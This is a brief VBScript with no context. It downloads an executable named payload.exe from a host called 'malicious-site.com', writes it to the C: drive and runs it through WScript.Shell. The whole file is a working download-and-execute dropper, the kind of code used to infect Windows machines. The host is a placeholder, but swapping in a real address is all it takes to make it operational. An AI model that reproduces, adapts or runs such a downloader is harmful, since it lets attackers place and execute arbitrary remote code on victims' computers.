Set x = CreateObject("Microsoft.XMLHTTP")
x.Open "GET", "http://malicious-site.com/payload.exe", False
x.Send

Set s = CreateObject("ADODB.Stream")
s.Type = 1
s.Open
s.Write x.ResponseBody
s.SaveToFile "C:\payload.exe", 2
Set shell = CreateObject("WScript.Shell")
shell.Run "C:\payload.exe"